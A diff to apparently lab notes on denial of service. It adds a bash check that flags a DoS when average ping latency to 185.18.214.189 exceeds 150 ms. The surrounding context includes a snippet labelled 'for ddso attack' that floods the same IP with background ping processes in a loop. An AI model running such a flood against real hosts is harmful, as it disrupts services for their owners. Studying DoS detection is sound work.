@@ -26,6 +26,17 @@ with open("test.ping", "r") as f:
 for ip in sorted(pings, key=lambda x: pings[x], reverse=True):
     print(f'{ip} pinged {pings[ip]} times')
 ```
+run this code to check ping
+```bash
+png=` ping -c 5 185.18.214.189 | tail -n 1 | awk '{print $4}' | cut -d "/" -f 2 | cut -d "." -f 1`
+echo "avg ping is $png"
+if [ $png -gt 150 ]
+then
+		echo "dos detected"
+else
+		echo "ok"
+fi
+```
 
 run this code for ddso attack
 ```bash
@@ -34,6 +45,7 @@ do
 	ping 185.18.214.189 &
 done
 ```
+
 
 # find number of requests per second
 
